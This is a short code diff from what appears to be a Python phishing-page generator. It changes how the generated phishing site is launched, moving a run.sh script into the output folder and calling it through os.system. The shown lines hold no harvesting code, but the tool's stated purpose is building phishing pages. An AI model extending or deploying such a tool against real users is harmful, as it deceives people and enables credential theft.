@@ -121,10 +121,11 @@ def main(args):
     os.makedirs(output_dir + '/templates')
     shutil.move('app.py', output_dir)
     shutil.move('index.html', output_dir + '/templates')
+    shutil.move('template_app/run.sh', output_dir)
     print "[*] Phishing page ready !"
     runnow = raw_input("Run now ? (y/n)")
     if runnow == 'y':
-        os.system("python app/app.py runserver -h 0.0.0.0 -p 8000 --threaded")
+        os.system("app/run.sh")
 
 if __name__ == '__main__':
     from argparse import ArgumentParser
